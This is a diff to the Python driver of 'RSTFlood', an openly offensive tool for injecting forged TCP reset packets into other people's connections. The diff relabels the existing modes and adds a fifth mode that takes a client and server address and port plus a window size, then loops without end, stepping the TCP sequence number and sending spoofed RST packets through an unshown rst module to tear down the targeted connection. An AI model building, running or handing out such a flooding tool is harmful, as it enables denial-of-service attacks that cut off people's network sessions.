@@ -9,24 +9,6 @@ def echo_another():
     print("RSTFlood Utils [https://github.com/DreamDevelopmentTeam/RSTFlood.git]")
     print("By YELANDAOKONG")
 
-def echo():
-    print("Echo")
-
-def echo_again():
-    print("Echo again")
-
-def echo_yet_again():
-    print("Echo yet again")
-
-def echo_yet_yet_again():
-    print("Echo yet yet again")
-
-def echo_yet_yet_yet_again():
-    print("Echo yet yet yet again")
-
-def echo_yet_yet_yet_yet_again():
-    print("Echo yet yet yet yet again")
-
 def clear():
     if os.name == "nt":
         os.system("cls")
@@ -41,10 +23,11 @@ def exit():
 def choose():
     while True:
         print("Choose an option: ")
-        print("=> 1. Random client IP/port and known server IP/port")
-        print("=> 2. Unknown client port and known server IP/port, client IP")
-        print("=> 3. Known client IP/port, server IP/port")
-        print("=> 4. Unknown client port and known server IP/port, client IP [Multi-threading, 0-65535]")
+        print("=> 1. Random client IP/port and known server IP/port [Random Seq]")
+        print("=> 2. Unknown client port and known server IP/port, client IP [Random Seq]")
+        print("=> 3. Known client IP/port, server IP/port [Random Seq]")
+        print("=> 4. Unknown client port and known server IP/port, client IP [Multi-threading, 0-65535] [Random Seq]")
+        print("=> 5. Known client IP/port, server IP/port [Foreach Seq]")
         print("")
         input_str = input("Your choice > ")
         num = 0
@@ -53,7 +36,7 @@ def choose():
         except ValueError:
             print("\nInvalid input, please try again.")
             continue
-        if num == 0 or num > 4:
+        if num == 0 or num > 5:
             print("\nInvalid input, please try again.")
             continue
         else:
@@ -88,7 +71,7 @@ if __name__ == "__main__":
         clear()
         echo_another()
         print("")
-        print("Mode => (1) Random client IP/port and known server IP/port")
+        print("Mode => (1) Random client IP/port and known server IP/port [Random Seq]")
         print("")
         print("Server IP/port: " + saddr + ":" + sport)
         print("")
@@ -122,7 +105,7 @@ if __name__ == "__main__":
         clear()
         echo_another()
         print("")
-        print("Mode => (2) Unknown client port and known server IP/port, client IP")
+        print("Mode => (2) Unknown client port and known server IP/port, client IP [Random Seq]")
         print("")
         print("Server IP/port: " + saddr + ":" + sport)
         print("Client IP/port: " + caddr + ":" + "Unknown")
@@ -163,7 +146,7 @@ if __name__ == "__main__":
         clear()
         echo_another()
         print("")
-        print("Mode => (3) Known client IP/port, server IP/port")
+        print("Mode => (3) Known client IP/port, server IP/port [Random Seq]")
         print("")
         print("Server IP/port: " + saddr + ":" + sport)
         print("Client IP/port: " + caddr + ":" + cport)
@@ -196,7 +179,7 @@ if __name__ == "__main__":
         clear()
         echo_another()
         print("")
-        print("Mode => (4) Unknown client port and known server IP/port, client IP [Multi-threading, 0-65535]")
+        print("Mode => (4) Unknown client port and known server IP/port, client IP [Multi-threading, 0-65535] [Random Seq]")
         print("")
         print("Server IP/port: " + saddr + ":" + sport)
         print("Client IP/port: " + caddr + ":" + "Unknown")
@@ -221,6 +204,59 @@ if __name__ == "__main__":
                     t.join()
                 exit()
 
+            except Exception as e:
+                print("Error: " + str(e))
+                exit()
+    if i == 5:
+        saddr = ""
+        sport = ""
+        caddr = ""
+        cport = ""
+        while True:
+            saddr = input("Server IP > ")
+            sport = input("Server port > ")
+            caddr = input("Client IP > ")
+            cport = input("Client port > ")
+            winsize = input("TCP Windows Size > ")
+            # check sport vailid
+            if not sport.isdigit() or int(sport) < 1 or int(sport) > 65535:
+                print("Invalid input, please try again.")
+                continue
+            else:
+                if not cport.isdigit() or int(cport) < 1 or int(cport) > 65535:
+                    print("Invalid input, please try again.")
+                    continue
+                else:
+                    if not winsize.isdigit() or int(winsize) < 1 or int(winsize) > 65535:
+                        print("Invalid input, please try again.")
+                        continue
+                    else:
+                        break
+        clear()
+        echo_another()
+        print("")
+        print("Mode => (5) Known client IP/port, server IP/port [Foreach Seq]")
+        print("")
+        print("Server IP/port: " + saddr + ":" + sport)
+        print("Client IP/port: " + caddr + ":" + cport)
+        print("TCP Windows Size: " + winsize)
+        print("")
+        # seq_i = int(rst.SEQ_MAX / int(winsize))
+        seq_i = int(winsize)
+        print("Seq: " + str(seq_i))
+        seq = 0
+        while True:
+            print("[+] Send " + str(seq) + " packets")
+            if seq > rst.SEQ_MAX:
+                seq = 0
+            seq = seq + seq_i
+            try:
+                # print("===> Client IP/port: " + str(caddr) + ":" + str(cport))
+                rst.send_tcp_rst_plus(caddr, int(cport), saddr, int(sport), seq)
+                inum = inum + 1
+            except KeyboardInterrupt:
+                print("Stop.")
+                exit()
             except Exception as e:
                 print("Error: " + str(e))
                 exit()
